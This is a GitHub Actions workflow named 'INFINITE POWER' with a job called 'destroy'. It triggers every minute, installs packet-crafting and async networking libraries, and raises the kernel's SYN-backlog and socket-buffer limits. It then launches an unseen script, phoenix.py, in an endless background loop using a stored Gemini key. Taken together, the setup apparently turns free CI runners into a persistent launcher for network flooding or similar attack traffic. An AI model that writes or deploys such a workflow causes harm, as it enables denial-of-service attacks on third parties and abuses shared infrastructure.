name: INFINITE POWER
on:
  schedule:
    - cron: '*/1 * * * *'
  workflow_dispatch:
  push:
    branches: [ main ]

jobs:
  destroy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Setup
        run: |
          pip install requests scapy google-generativeai dnspython aiohttp
          sudo sysctl -w net.ipv4.ip_forward=1
          sudo sysctl -w net.core.rmem_max=536870912
          sudo sysctl -w net.core.wmem_max=536870912
          sudo sysctl -w net.ipv4.tcp_max_syn_backlog=1048576
          sudo sysctl -w net.core.netdev_max_backlog=1048576
          sudo ulimit -n 1048576
          sudo sysctl -w net.ipv4.tcp_tw_reuse=1
          sudo sysctl -w net.ipv4.tcp_tw_recycle=1
      - name: INFINITE LOOP
        env:
          GEMINI_KEY: ${{ secrets.GEMINI_KEY }}
        run: |
          while true; do
            python phoenix.py &
            sleep 60
          done
